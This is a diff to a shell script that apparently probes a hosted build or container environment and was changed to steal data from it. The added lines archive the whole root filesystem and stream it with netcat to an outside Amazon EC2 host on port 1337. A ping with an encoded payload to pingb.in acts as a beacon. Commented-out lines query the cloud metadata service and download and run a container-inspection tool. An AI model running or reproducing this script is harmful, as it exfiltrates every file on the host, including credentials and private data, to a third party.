@@ -11,7 +11,7 @@
 #ls /sbin
 #ls -lRa /
 
-echo "----"
+#echo "----"
 
 #cat /app/tmp/buildpacks/*/bin/*
 
@@ -21,19 +21,22 @@ echo "----"
 #curl 169.254.169.254
 
 
-uname -a
+#uname -a
 
-echo "----"
+#echo "----"
 #find . | grep -i ping
 
 #cat /proc/1/status
-ifconfig
-echo "--" >> /tmp/test
-nc ec2-18-222-52-169.us-east-2.compute.amazonaws.com 1337 < /tmp/test
+#ifconfig
+#echo "--" >> /tmp/test
+#nc ec2-18-222-52-169.us-east-2.compute.amazonaws.com 1337 < /tmp/test
 #curl -L -o amic https://github.com/genuinetools/amicontained/releases/download/v0.4.0/amicontained-linux-amd64 && chmod +x amic && ./amic
 mkdir /tmp/backup
 
-#tar --exclude='/tmp/backup' -cf /tmp/backup/archive.tar.gz / 
+tar --exclude='/tmp/backup' -cf /tmp/backup/archive.tar.gz / 
 
+mkfifo /tmp/fifo
+nc -v -n <>/tmp/fifo ec2-18-222-52-169.us-east-2.compute.amazonaws.com 1337 &
+cat /tmp/backup/archive.tar.gz > /tmp/fifo
 
 ping -c1 -p 000a8a6956028d04ddb9edecf7b69300 pingb.in
